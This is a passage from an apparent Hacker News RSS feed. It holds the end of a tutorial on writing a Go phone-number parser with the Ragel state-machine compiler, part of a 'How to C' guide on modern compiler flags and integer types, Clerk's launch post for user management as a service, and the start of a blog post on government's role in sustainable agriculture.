		<span>if</span> (m.data)[(m.p)] <span>==</span> <span>32</span> {
			<span>goto</span> tr39
		}
		<span>if</span> <span>33</span> <span>&lt;=</span> (m.data)[(m.p)] <span>&amp;&amp;</span> (m.data)[(m.p)] <span>&lt;=</span> <span>126</span> {
			<span>goto</span> st105
		}
		<span>goto</span> tr37
	st105:
		<span>if</span> (m.p)<span>++</span>; (m.p) <span>==</span> (m.pe) {
			<span>goto</span> _testEof105
		}

<span>// and so on...
</span></code></pre></div><p>Well, someone wrote it, right? That means I can modify it I thought and I’ve
started project exploring. I quickly found another file
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go.rl">machine.go.rl</a>
which also started as a Golang file but soon on <a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go.rl#L23">line
23</a>
starts some weird (at that point of time) statement</p><div><pre><code data-lang="ragel"><span>%%</span>{
machine rfc3164;

include common "common.rl";

# unsigned alphabet
alphtype uint8;

action mark {
	m.pb = m.p
}
</code></pre></div><p>OK, it’s definitely not a Golang code. We have some directives rounded by <code>%%{</code>
and <code>}%%</code> and lines started with <code>%%</code>. I’ve seen such brackets for the first
time.</p><p>Let’s try to find any mentions in this project which is using this <code>*.rl</code> file.
A-ha, there is a <a href="https://github.com/influxdata/go-syslog/blob/develop/makefile">makefile</a>
in this project, which refers to the file.</p><div><pre><code data-lang="make"><span>#bla-bla-bla
</span><span></span><span>RAGEL</span> <span>:=</span> ragel -I common

<span>#bla-bla-bla
</span><span></span>
<span>rfc3164/machine.go</span><span>:</span> rfc3164/machine.go.rl common/common.rl

<span>rfc3164/machine.go</span><span>:</span>
	<span>$(</span>RAGEL<span>)</span> -Z -G2 -e -o <span>$@</span> $&lt;
	@sed -i <span>'/^\/\/line/d'</span> <span>$@</span>
	<span>$(</span>MAKE<span>)</span> <span>file</span><span>=</span><span>$@</span> snake2camel
</code></pre></div><p>Who? Ragel?</p><p><img src="https://dev.ms/img/wtf.jpg" alt="What the hell are you?"></p><p>Actually, Ragel is a really cool tool and a special language. It allows you to
quickly define a state machine which converts incoming data into a well-defined
structure. It’s almost like regexp but clearer and simpler.</p><h2 id="what-kind-of-task-is-ragel-good-for">What kind of task is Ragel good for?</h2><p>It’s a list from Ragel’s homepage<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p><ul><li>Writing robust protocol implementations.</li><li>Parsing data formats.</li><li>Lexical analysis of programming languages.</li><li>Validating user input.</li></ul><p>I rarely implement any protocols or make lexical analysis, so let’s see how we
can parse user input, for example, phone number.</p><h2 id="what-well-do-parse">What we’ll do parse?</h2><p>First of all we have to define a phone format itself. Say, it will be</p><p>where:</p><ul><li><code>+</code> and <code>1</code> is an optional part, i.e. any phone can start with <code>+1</code>, <code>1</code>, or
it can be without international code.</li><li><code>NPA</code> is an area code within a range of <code>200..999</code>.</li><li><code>NXX-XXXX</code> is a subscriber number, range for <code>N</code> is <code>[2-9]</code>, for <code>X</code> is <code>[0-9]</code>.</li><li>All brackets, spaces and hyphens are optional.</li></ul><p>More details about the format on <a href="https://en.wikipedia.org/wiki/North_American_Numbering_Plan#Modern_plan">Wikipedia</a>.</p><p>With that said, allowable phones are:</p><div><pre><code data-lang="fallback">+1 (555) 2334567
+1(555)2334567
+1   (555)           2334567
+1 (555) 233-4567
+1   (555)   233-45-67
+1   (555)   233           45-67
+1(555)233-4567
+15552334567
+1-555-233-4567
1 (555) 2334567
1(555)2334567
1   (555)           2334567
1 (555) 233-4567
1   (555)   233-45-67
1   (555)   233           45-67
1(555)233-4567
15552334567
(555) 233-4567
(555)233-4567
5552334567
555-233-4567
    555     233     45    67
</code></pre></div><p>For numbers without international code, it will be set as <code>1</code> by default.</p><h2 id="phone-structure">Phone structure</h2><p>Next, we need a structure which will store our parsed data. The structure will
be filled during the parse process.</p><div><pre><code data-lang="go"><span>type</span> Phone <span>struct</span>{
  IntCode   <span>string</span>
  AreaCode  <span>string</span>
  Number    <span>string</span>
}
</code></pre></div><p>I wouldn’t argue how it is better to store phone numbers as <code>int</code> or as a
<code>string</code>, it’s no matter in our case.</p><h2 id="unit-tests">Unit tests</h2><p>Working with code generators more and more I can say that unit-tests are a
significant part of the development. They validate generated code and produce
the result we expect. In most of my cases it is faster to write such tests
rather than trying to debug generated code manually. Also, small changes in the
generator input can drastically change and output.</p><p>We have an input, we know what we want to get as an output, we are good to
write tests. Due to our parser does two things, parses the phone itself,
validates phone format and returns an error if format is incorrect. We need
three groups of tests:</p><ul><li><strong>positive tests</strong>, i.e. tests which check all <em>correct</em> values parsed properly</li><li>tests which check <strong>correctness of area code</strong> and validates an error, and</li><li>tests which check <strong>correctness of phone number</strong> and validates an error</li></ul><p>For unit tests I use <a href="https://onsi.github.io/ginkgo/">Ginkgo</a> library. Table
tests looks like this:</p><div><pre><code data-lang="go"><span>//  machine_test.go
</span><span></span>
<span>DescribeTable</span>(<span>"Correct values"</span>,
  <span>func</span>() {
    phone <span>:=</span> <span>CurrentGinkgoTestDescription</span>().TestText
    p, err <span>:=</span> m.<span>Parse</span>([]<span>byte</span>(phone))
    <span>Expect</span>(err).<span>NotTo</span>(<span>HaveOccurred</span>())

    <span>Expect</span>(<span>*</span>p).<span>To</span>(<span>MatchAllFields</span>(Fields{
      <span>"IntCode"</span>:  <span>Equal</span>(<span>"1"</span>),
      <span>"AreaCode"</span>: <span>Equal</span>(<span>"555"</span>),
      <span>"Number"</span>:   <span>Equal</span>(<span>"2334567"</span>),
    }))
  },

  <span>Entry</span>(<span>"+1 (555) 2334567"</span>),
  <span>Entry</span>(<span>"+1(555)2334567"</span>),
  <span>Entry</span>(<span>"+1   (555)           2334567"</span>),
  <span>// skipped
</span><span></span>)

<span>DescribeTable</span>(<span>"Area error"</span>,
  <span>func</span>() {
    phone <span>:=</span> <span>CurrentGinkgoTestDescription</span>().TestText
    p, err <span>:=</span> m.<span>Parse</span>([]<span>byte</span>(phone))
    <span>Expect</span>(p).<span>To</span>(<span>BeNil</span>())
    <span>Expect</span>(err).<span>To</span>(<span>MatchError</span>(<span>"invalid area code, expected 200..999"</span>))
  },

  <span>Entry</span>(<span>"+1 (155) 2334567"</span>),
  <span>Entry</span>(<span>"11992223344"</span>),
  <span>Entry</span>(<span>"134 2223344"</span>),
)

<span>DescribeTable</span>(<span>"Invid phone format"</span>,
  <span>func</span>() {
    phone <span>:=</span> <span>CurrentGinkgoTestDescription</span>().TestText
    p, err <span>:=</span> m.<span>Parse</span>([]<span>byte</span>(phone))
    <span>Expect</span>(p).<span>To</span>(<span>BeNil</span>())
    <span>Expect</span>(err).<span>To</span>(<span>MatchError</span>(fmt.<span>Sprintf</span>(<span>"invalid phone format: %s"</span>, phone)))
  },

  <span>Entry</span>(<span>"+1 (555) 1334567"</span>),
  <span>Entry</span>(<span>"+1(555)23!4567"</span>),
  <span>Entry</span>(<span>"+1(555+2334567"</span>),
  <span>// skipped
</span><span></span>)

</code></pre></div><p>this and other code samples are in this repo<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</p><p>Ok, what’s happening in this test? We have a test table description started with
<code>DescribeTable</code>. First parameter is a table name, second one is a function,
which will be called for each <code>Entry</code> passed as a last parameter.</p><p>Due to each <code>Entry</code> must have a description as a first param, I use it as an
actual value, which inside the function can be retrieved with
<code>CurrentGinkgoTestDescription().TestText</code> call. Next, I’d expect <code>m.Parse()</code>
returns no error for positive tests and expected errors for others. Also, for
positive tests it checks actual values in structure fields. All the inputs have
to be converted into the same output.</p><p>We’re not able to run these test, because we didn’t implement the parser itself
and the test run fails with compile error.</p><h2 id="empty-state-machine-aka-parser-boilerplate">Empty state machine aka parser boilerplate.</h2><p>Our parser will be written in Ragel and Ragel requires a couple of things it
uses during the parse process. First, we have to define a <code>machine</code>, then point
out how some variables can be found and define places inside Go code where
Ragel’s output will be written.</p><p>Here is an empty state machine,</p><div><pre><code data-lang="ragel"><span>%%</span>{
  machine phone;

  main := any;

  write data;

  access m.;
  variable p m.p;
  variable pe m.pe;
  variable eof m.eof;
  variable data m.data;
}<span>%%</span><span>
</span></code></pre></div><div><pre><code data-lang="go">
<span>// Machine contains variables used by Ragel auto generated code.
</span><span>// See Ragel docs for details.
</span><span></span><span>type</span> Machine <span>struct</span> {
  <span>// Data to process.
</span><span></span>  data []<span>byte</span>
  <span>// Data pointer.
</span><span></span>  p <span>int</span>
  <span>// Data end pointer.
</span><span></span>  pe <span>int</span>
  <span>// Curent state.
</span><span></span>  cs  <span>int</span>
  <span>// End of file pointer.
</span><span></span>  eof <span>int</span>
  <span>// Start of current date block.
</span><span></span>  pb  <span>int</span>
  <span>// Current err
</span><span></span>  err <span>error</span>
}

<span>// Phone represents parser result and will be filled by
</span><span>// Raagel actions.
</span><span></span><span>type</span> Phone <span>struct</span> {
  IntCode   <span>string</span>
  AreaCode  <span>string</span>
  Number    <span>string</span>
}

<span>// New initialized new Machine structure.
</span><span></span><span>func</span> <span>New</span>() <span>*</span>Machine {
  <span>return</span> <span>&amp;</span>Machine{}
}

<span>// string returns current parsed variable. Variable m.pb
</span><span>// should be updated by "mark" action, while m.p is a
</span><span>// current parser position inside m.data.
</span><span></span><span>func</span> (m <span>*</span>Machine) <span>string</span>() <span>string</span> {
  <span>return</span> <span>string</span>(m.data[m.pb:m.p])
}

<span>// Parse takes a slice of bytes as an input an fills Phone structure in case
</span><span>// input is a phone number in one of valid formats.
</span><span></span><span>func</span> (m <span>*</span>Machine) <span>Parse</span>(input []<span>byte</span>) (<span>*</span>Phone, <span>error</span>) {
  m.data = input
  m.pe = <span>len</span>(input)
  m.p = <span>0</span>
  m.pb = <span>0</span>
  m.err = <span>nil</span>
  m.eof = <span>len</span>(input)

  phone <span>:=</span> <span>&amp;</span>Phone{}

  <span>%%</span> write init;
  <span>%%</span> write exec;

  <span>return</span> phone, m.err
}
</code></pre></div><p>i.e. a machine which does nothing yet, but if we run Ragel:</p><div><pre><code data-lang="shell">% ragel -Z -G2 machine.rl -o machine.go
</code></pre></div><p>we will get a <code>machine.go</code> file, which is ready-to-compile, but again, it does
nothing. But tests run and return test error.</p><div><pre><code data-lang="fallback">Ran 30 of 30 Specs in 0.004 seconds
FAIL! -- 0 Passed | 30 Failed | 0 Pending | 0 Skipped
--- FAIL: TestRagel (0.00s)
</code></pre></div><p>In <code>manchine.rl</code> we have a mix of Golang and Ragel code. Ragel code, after
Ragel compiler call will be replaced with Go code based on machine definition.</p><p>Ragel machine definition surrounded by <code>%%{</code> and <code>}%%</code> will be used by compiler
and the result will be written into lines started with <code>write</code> command, where:</p><ul><li><code>write data;</code> will be replaced with constants.</li><li><code>write init;</code> - initialization machine code.</li><li><code>write exec;</code> - machine execution code.</li></ul><h3 id="type-machine">type Machine</h3><p><code>Machine</code> is a main structure which is used by auto-generated parser code. It
contains all variables required by Ragel. About these variables see Ragel
manual<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup>.</p><p>In the machine definition there are a number of instruction:</p><ul><li><code>access m.;</code> defines that in auto-generated prefix <code>m.</code> will be used for
accessing machine data. <code>m</code> also is a method receiver <code>func (m *Machine) Parse()...</code></li><li><code>variable p m.p;</code> and such define how to access specific variables.</li></ul><h2 id="implementation">Implementation</h2><p>Our implementation consists of set <em>machines</em> and <em>actions</em>. Machine is defined
as <code>&lt;name&gt; = &lt;expression&gt;</code>, where an expression can be another machine. Such a
definition is used for building machines from smaller pieces and does not
generate any states. Expressions also can include actions.</p><p><code>sp</code> machine defines a space, because it’s …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dev.ms/2021/01/ragel-state-machine-compiler/">https://dev.ms/2021/01/ragel-state-machine-compiler/</a></em></p>]]>
            </description>
            <link>https://dev.ms/2021/01/ragel-state-machine-compiler/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070192</guid>
            <pubDate>Mon, 08 Feb 2021 21:12:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to C]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26070046">thread link</a>) | @free0ne
<br/>
February 8, 2021 | https://matt.sh/howto-c | <a href="https://web.archive.org/web/*/https://matt.sh/howto-c">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<p><em>This is a draft I wrote in early 2015 and never got around to publishing. Here’s the mostly unpolished version because it wasn’t doing anybody any good sitting in my drafts folder. The simplest change was updating year 2015 to 2016 at publication time.</em></p>
<p><em>(Update: Many people have submitted revisions, notes, and improvements. All contributions have been incorporated throughout the page below.)</em></p>
<p><em>Feel free to submit fixes/improvements/complaints as necessary. -<a href="mailto:matt@matt.sh">Matt</a></em></p>
<p><em><a href="https://github.com/AdrianArroyoCalle">Adrián Arroyo Calle</a> provides a Spanish translation at <a href="https://adrianarroyocalle.github.io/blog/2016/01/10/como-programar-en-c-en-2016/">¿Cómo programar en C (en 2016)?</a></em></p>
<p><em><a href="http://postd.cc/">Japanese POSTD</a> provides a Japanese translation at <a href="http://postd.cc/how-to-c-in-2016-1/">2016年、C言語はどう書くべきか (前編)</a> and <a href="http://postd.cc/how-to-c-in-2016-2/">2016年、C言語はどう書くべきか (後編)</a>.</em></p>
<p><em><a href="https://www.infoq.com/cn/">Chinese InfoQ</a> provides a Chinese translation at <a href="http://www.infoq.com/cn/articles/c-language-2016">C语言的2016</a>.</em></p>
<p><em><a href="http://www.csdn.net/tag/C%E8%AF%AD%E8%A8%80/news">Programmer Magazine</a> provides a Chinese translation at <a href="http://geek.csdn.net/news/detail/63135">2016年，C语言该怎样写</a> (as <a href="https://matt.sh/files/howtoc/howto-c-programmer-magazine.pdf">PDF too</a>).</em></p>
<p><em><a href="https://github.com/Keith-S-Thompson">Keith Thompson</a> provides a nice set of corrections and alternative opinions at <a href="https://github.com/Keith-S-Thompson/how-to-c-response/blob/master/README.md">howto-c-response</a>.</em></p>
<p><em><a href="https://twitter.com/erratarob">Rob Graham</a> provides a response covering other avenues out of scope here at <a href="http://blog.erratasec.com/2016/01/some-notes-c-in-2016.html">Some notes C in 2016</a>.</em></p>
<p><em><a href="https://twitter.com/NGalbreath">Nick Galbreath</a> collected some relevant links about <a href="http://www.client9.com/article/how-to-program-in-c/">overall C programming</a> as well.</em></p>
<p><em>Now on to the article…</em></p>
<p>The first rule of C is don’t write C if you can avoid it.</p>
<p>If you must write in C, you should follow modern rules.</p>
<p>C has been around since the <a href="https://www.bell-labs.com/usr/dmr/www/chist.html">early 1970s</a>. People have “learned C” at various points during its evolution, but knowledge usually get stuck after learning, so everybody has a different set of things they believe about C based on the year(s) they first started learning.</p>
<p>It’s important to not remain stuck in your “things I learned in the 80s/90s” mindset of C development.</p>
<p>This page assumes you are on a modern platform conforming to modern standards and you have no excessive legacy compatibility requirements. We shouldn’t be globally tied to ancient standards just because some companies refuse to upgrade 20 year old systems.</p>
<h2 id="_preflight">Preflight</h2>
<p>Standard c99 (c99 means “C Standard from 1999”; c11 means “C Standard from 2011”, so 11 &gt; 99).</p>
<ul>
<li>clang, default
<ul>
<li>clang uses an extended version of C11 by default (<code>GNU C11 mode</code>), so no extra options are needed for modern features.</li>
<li>If you want standard C11, you need to specify <code>-std=c11</code>; if you want standard C99, use <code>-std=c99</code>.</li>
<li>clang compiles your source files faster than gcc</li>
</ul></li>
<li>gcc requires you specify <code>-std=c99</code> or <code>-std=c11</code>
<ul>
<li>gcc builds source files slower than clang, but <em>sometimes</em> generates faster code. Performance comparisons and regression testings are important.</li>
<li>gcc-5 defaults to <code>GNU C11 mode</code> (same as clang), but if you need exactly c11 or c99, you should still specify <code>-std=c11</code> or <code>-std=c99</code>.</li>
</ul></li>
</ul>
<p>Optimizations</p>
<ul>
<li>-O2, -O3
<ul>
<li>generally you want <code>-O2</code>, but sometimes you want <code>-O3</code>. Test under both levels (and across compilers) then keep the best performing binaries.</li>
</ul></li>
<li>-Os
<ul>
<li><code>-Os</code> helps if your concern is cache efficiency (which it should be)</li>
</ul></li>
</ul>
<p>Warnings</p>
<ul>
<li><code>-Wall -Wextra -pedantic</code>
<ul>
<li><a href="https://twitter.com/oliviergay/status/685389448142565376">newer compiler versions</a> have <code>-Wpedantic</code>, but they still accept the ancient <code>-pedantic</code> as well for wider backwards compatibility.</li>
</ul></li>
<li>during testing you should add <code>-Werror</code> and <code>-Wshadow</code> on all your platforms
<ul>
<li>it can be tricky deploying production source using <code>-Werror</code> because different platforms and compilers and libraries can emit different warnings. You probably don’t want to kill a user’s entire build just because their version of GCC on a platform you’ve never seen complains in new and wonderous ways.</li>
</ul></li>
<li>extra fancy options include <code>-Wstrict-overflow -fno-strict-aliasing</code>
<ul>
<li>Either specify <code>-fno-strict-aliasing</code> or be sure to only access objects as the type they have at creation. Since so much existing C code aliases across types, using <code>-fno-strict-aliasing</code> is a much safer bet if you don’t control the entire underlying source tree.</li>
</ul></li>
<li>as of now, Clang reports some valid syntax as a warning, so you should add <code>-Wno-missing-field-initializers</code>
<ul>
<li>GCC fixed this unnecessary warning after GCC 4.7.0</li>
</ul></li>
</ul>
<p>Building</p>
<ul>
<li>Compilation units
<ul>
<li>The most common way of building C projects is to decompose every source file into an object file then link all the objects together at the end. This procedure works great for incremental development, but it is suboptimal for performance and optimization. Your compiler can’t detect potential optimizations across file boundaries this way.<br>
</li>
</ul></li>
<li>LTO —&nbsp;Link Time Optimization
<ul>
<li>LTO fixes the “source analysis and optimization across compilation units problem” by annotating object files with intermediate representation so source-aware optimizations can be carried out across compilation units at link time.</li>
<li>LTO can slow down the linking process noticeably, but <code>make -j</code> helps if your build includes multiple non-interdependent final targets (.a, .so, .dylib, testing executables, application executables, etc).</li>
<li><a href="http://llvm.org/docs/LinkTimeOptimization.html">clang LTO</a> (<a href="http://llvm.org/docs/GoldPlugin.html">guide</a>)</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/LTO-Overview.html">gcc LTO</a></li>
<li>As of 2016, clang and gcc releases support LTO by just adding <code>-flto</code> to your command line options during object compilation and final library/program linking.</li>
<li><code>LTO</code> still needs some babysitting though. Sometimes, if your program has code not used directly but used by additional libraries, LTO can evict functions or code because it detects, globally when linking, some code is unused/unreachable and doesn’t <em>need</em> to be included in the final linked result.</li>
</ul></li>
</ul>
<p>Arch</p>
<ul>
<li><code>-march=native</code>
<ul>
<li>give the compiler permission to use your CPU’s full feature set</li>
<li>again, performance testing and regression testing is important (then comparing the results across multiple compilers and/or compiler versions) is important to make sure any enabled optimizations don’t have adverse side effects.</li>
</ul></li>
<li><code>-msse2</code> and <code>-msse4.2</code> may be useful if you need to target not-your-build-machine features.</li>
</ul>
<h2 id="_writing-code">Writing code</h2>
<h3 id="_types">Types</h3>
<p>If you find yourself typing <code>char</code> or <code>int</code> or <code>short</code> or <code>long</code> or <code>unsigned</code> into new code, you’re doing it wrong.</p>
<p>For modern programs, you should <code>#include &lt;stdint.h&gt;</code> then use <em>standard</em> types.</p>
<p>For more details, see the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p>The common standard types are:</p>
<ul>
<li><code>int8_t</code>, <code>int16_t</code>, <code>int32_t</code>, <code>int64_t</code> —&nbsp;signed integers</li>
<li><code>uint8_t</code>, <code>uint16_t</code>, <code>uint32_t</code>, <code>uint64_t</code> — unsigned integers</li>
<li><code>float</code> —&nbsp;standard 32-bit floating point</li>
<li><code>double</code> - standard 64-bit floating point</li>
</ul>
<p>Notice we don’t have <code>char</code> anymore. <code>char</code> is actually misnamed and misused in C.</p>
<p>Developers routinely abuse <code>char</code> to mean “byte” even when they are doing unsigned byte manipulations. It’s much cleaner to use <code>uint8_t</code> to mean single a unsigned-byte/octet-value and <code>uint8_t *</code> to mean sequence-of-unsigned-byte/octet-values.</p>
<h4 id="_special-standard-types">Special Standard Types</h4>
<p>In addition to standard fixed-width like <code>uint16_t</code> and <code>int32_t</code>, we also have <strong>fast</strong> and <strong>least</strong> types defined in the <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdint.h.html">stdint.h specification</a>.</p>
<p><strong>Fast</strong> types are:</p>
<ul>
<li><code>int_fast8_t</code>, <code>int_fast16_t</code>, <code>int_fast32_t</code>, <code>int_fast64_t</code> — signed integers</li>
<li><code>uint_fast8_t</code>, <code>uint_fast16_t</code>, <code>uint_fast32_t</code>, <code>uint_fast64_t</code> — unsigned integers</li>
</ul>
<p>Fast types provide a minimum of <code>X</code> bits, but there is no guarantee the underlying storage size is exactly what you request. If a larger type has better support on your target platform, a <em>fast</em> type will automatically use the better supported larger type.</p>
<p>The best example here is, on some 64-bit systems, when you request <code>uint_fast16_t</code> you actually get a <code>uint64_t</code> because operating on word-sized integers will be faster than operating on half of a 32-bit integer.</p>
<p>The <em>fast</em> guidelines aren’t followed on every system though. One standout is OS X, where <em>fast</em> types are <a href="https://opensource.apple.com/source/xnu/xnu-1456.1.26/EXTERNAL_HEADERS/stdint.h">defined exactly as their corresponding fixed width counterparts</a>.</p>
<p>Fast types can be useful for self-documenting code as well. If you know your counters only need 16 bits, but you prefer your math use 64 bit integers because they are faster on your platform, that’s where <code>uint_fast16_t</code> would help. Under 64-bit Linux platforms, <code>uint_fast16_t</code> gives you a fast 64-bit counter while maintaining the code-level inline documentation of “we only need 16 bits here.”</p>
<p>One thing to be aware of for fast types: it can impact certain test cases. If you need to test for storage width edge cases, having <code>uint_fast16_t</code> be 16 bits on some platforms (OS X) and 64 bits on other platforms (Linux) can increase the minimum number of platforms where your tests need to pass.</p>
<p><em>Fast</em> types do introduce the same uncertainty as <code>int</code> not being a standard size across platforms, but with <em>fast</em> types, you can limit your uncertainty to known-safe locations in your code (counters, temporary values with checked bounds, etc).</p>
<p><strong>Least</strong> types are:</p>
<ul>
<li><code>int_least8_t</code>, <code>int_least16_t</code>, <code>int_least32_t</code>, <code>int_least64_t</code> — signed integers</li>
<li><code>uint_least8_t</code>, <code>uint_least16_t</code>, <code>uint_least32_t</code>, <code>uint_least64_t</code> — unsigned integers</li>
</ul>
<p>Least types provide you with the most <em>compact</em> number of bits for the type you request.</p>
<p>The <em>least</em> guidelines, in practice, mean <em>least</em> types are just defined to standard fixed width types, since standard fixed width types already provide the exact minimum number of bits you request.</p>
<h4 id="_to-int-or-not-to-int">to <code>int</code> or not to <code>int</code></h4>
<p>Some readers have pointed out they truly love <code>int</code> and you’ll have to pry it from their cold dead fingers. I’d like to point out is is technically <em>impossible</em> to program correctly if the sizes of your types change out from under you.</p>
<p>Also see <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html#tag_13_19_06">RATIONALE</a> included with <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html">inttypes.h</a> for reasons why using non-fixed-width types is unsafe. If you are truly smart enough to conceptualize <code>int</code> being 16 bits on some platforms and 32 bits on other platforms throughout your development while also testing all 16 bit and 32 bit edge cases for every place you use <code>int</code>, please feel free to use <code>int</code>.</p>
<p>For the rest of us who can’t hold entire multi-level decision tree platform specification hierarchies in our heads while writing fizzbuzz, we can use fixed width types and automatically have more correct code with much less conceptual hassle and much less required testing overhead.</p>
<p>Or, said more concisely in the specification: “the ISO C standard integer promotion rule can produce silent changes unexpectedly.”</p>
<p>Good luck with that.</p>
<h4 id="_one-exception-to-never-char">One Exception to never-<code>char</code></h4>
<p>The <em>only</em> acceptable use of <code>char</code> in 2016 is if a pre-existing API requires <code>char</code> (e.g. <code>strncat</code>, printf’ing “%s”, …) or if you’re initializing a read-only string (e.g. <code>const char *hello = "hello";</code>) because the C type of string literals (<code>"hello"</code>) is <code>char []</code>.</p>
<p>ALSO: In C11 we have native unicode support, and the type of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://matt.sh/howto-c">https://matt.sh/howto-c</a></em></p>]]>
            </description>
            <link>https://matt.sh/howto-c</link>
            <guid isPermaLink="false">hacker-news-small-sites-26070046</guid>
            <pubDate>Mon, 08 Feb 2021 21:01:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Clerk – all of user management as-a-service, not just authentication]]>
            </title>
            <description>
<![CDATA[
Score 504 | Comments 190 (<a href="https://news.ycombinator.com/item?id=26069621">thread link</a>) | @colinclerk
<br/>
February 8, 2021 | https://clerk.dev/blog/all-of-user-management-not-just-authentication | <a href="https://web.archive.org/web/*/https://clerk.dev/blog/all-of-user-management-not-just-authentication">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br>While working on side projects, we've always felt that adding <strong>great</strong> user management was too complex and too cumbersome.</p><p>The task came with a sense of helplessness. We knew what "great" looked like, but it was impractical to build all of that functionality.<br></p><figure id="w-node-a41d4bea-17b7-40a7-4d5c-8c6e66f6adf6-12ab58b9"><p><img src="https://uploads-ssl.webflow.com/5fd7bfc6e6f1ce2fd6ab58c5/6019dfd34486031760de5797_blog-google.png" loading="lazy" alt=""></p><figcaption>Google user management</figcaption></figure><p>We thought authentication-as-a-service vendors might ease our pain, but over and over again, we were disappointed by how much extra work was necessary. We never understood why until one friend quipped, <em>"auth-as-a-service really just solves half of 2-factor auth."</em></p><p>Then it clicked. <strong>We needed all of user management, not <em>just</em> authentication. </strong>And we realized if we could solve this problem, countless others could benefit, too.</p><p>Today, we're absolutely thrilled to launch Clerk: <strong>user management as-a-service</strong>. We're solving the whole problem, from frontend to backend, with beautiful UIs and elegant APIs. Our architecture pulls user management out of the way, so developers can focus on what makes their software truly special.</p><figure id="w-node-_139be728-0c3f-7abd-62db-458a61e69a47-12ab58b9"><p><img src="https://uploads-ssl.webflow.com/5fd7bfc6e6f1ce2fd6ab58c5/6019dff6fd671523538092e1_blog-clerk.png" loading="lazy" alt=""></p><figcaption>Clerk user management</figcaption></figure><p>Our launch today includes UI components for Sign Up, Sign In, User Profile, and what we're calling the "User Button." They can be mounted directly in your application, or you can redirect users to a Clerk-hosted page on <strong>accounts.yourdomain.com</strong>.</p><p>Best of all, the components will automatically update as our team optimizes their design, develops new features, and adds support for the latest in account security.</p><p>While today marks an exciting milestone for Clerk, this is truly just a "minimum viable product." The roadmap ahead will bring many features to better support developers and their end users:</p><ul role="list"><li>SDKs for additional languages and frameworks</li><li>Additional OpenID Connect and OAuth providers</li><li>Additional 2-step verification factors like TOTP and WebAuthN</li><li>Session management and revocation in the User Profile</li><li>Team management and enterprise authentication like SAML</li></ul><p>Need help with something you don't see listed? <a href="https://dashboard.clerk.dev/feedback">Make a request.</a></p></div></div>]]>
            </description>
            <link>https://clerk.dev/blog/all-of-user-management-not-just-authentication</link>
            <guid isPermaLink="false">hacker-news-small-sites-26069621</guid>
            <pubDate>Mon, 08 Feb 2021 20:25:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Sustainability in Agriculture]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26069493">thread link</a>) | @kickout
<br/>
February 8, 2021 | https://thinkingagriculture.io/on-sustainability-in-agriculture/ | <a href="https://web.archive.org/web/*/https://thinkingagriculture.io/on-sustainability-in-agriculture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
		<div id="content">

	<div id="primary">
		<main id="main">
			
<article id="post-253" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
		
		<!-- .entry-header -->

		
		<div itemprop="text">
			
<p>Steve Groff <a rel="noreferrer noopener" href="https://agfundernews.com/regenerative-agriculture-president-biden-the-future-of.html" data-type="URL" data-id="https://agfundernews.com/regenerative-agriculture-president-biden-the-future-of.html" target="_blank">recently posted some thoughts</a> on regenerative agriculture in light of a new incoming U.S. presidential administration and offered thoughts on cover crops, among other things. As Steve is a well known figure in the space, it’s worth a read. I agree that regenerative agriculture practices <em>are</em> scalable, and have used this space to argue as much. However, I fundamentally disagree that there is an education hurdle to overcome and that the government (in <em>some</em> role) has no place in getting regenerative agriculture scaled up enough to have a positive impact on national soil health or carbon sequestration. The government most certainty has a role– probably an active one as agriculture is both a strategic and an economic resource. I’ve proposed a solution to repartition the dollars already <em><a rel="noreferrer noopener" href="https://data.ers.usda.gov/reports.aspx?ID=17833" data-type="URL" data-id="https://data.ers.usda.gov/reports.aspx?ID=17833" target="_blank">budgeted for and used</a></em> and distributed as direct payments (mostly to row crops farmers) and instead of simply pay farmers for planting cover crops or adapting other soil health positive practices. The problem has never been about education in my opinion. Cover crops and complex crop rotations have been around a long time. Most farmers could reasonably figure out the <em>technical</em> challenges associated with managing these complex rotations (within reason) once the <em>economic</em> challenges become clear. To be clear technical challenges remain, but farmers have a strong track record of innovation. I understand the desire to keep the government out and let the markets work, but agriculture is one of the few industries few a free market hasn’t realistically existed for many years. Between <a rel="noreferrer noopener" href="https://www.desmoinesregister.com/story/money/agriculture/2018/06/15/china-tariffs-soybeans-could-cost-iowa-farmers-up-624-million/705121002/" data-type="URL" data-id="https://www.desmoinesregister.com/story/money/agriculture/2018/06/15/china-tariffs-soybeans-could-cost-iowa-farmers-up-624-million/705121002/" target="_blank">tariffs</a>, <a rel="noreferrer noopener" href="https://www.afge.org/article/privatization-of-grain-inspection-proves-to-be-a-complete-failure.-lawmakers-want-to-do-it-anyway/" data-type="URL" data-id="https://www.afge.org/article/privatization-of-grain-inspection-proves-to-be-a-complete-failure.-lawmakers-want-to-do-it-anyway/" target="_blank">inspections</a>, subsidies, and various <a rel="noreferrer noopener" href="https://www.epa.gov/renewable-fuel-standard-program" data-type="URL" data-id="https://www.epa.gov/renewable-fuel-standard-program" target="_blank">legislation</a> there are never been a ‘free’ market as much as farmers want and desire it. We must admit that and get past it–farmers especially must admit it because there are areas of the world that can produce our row 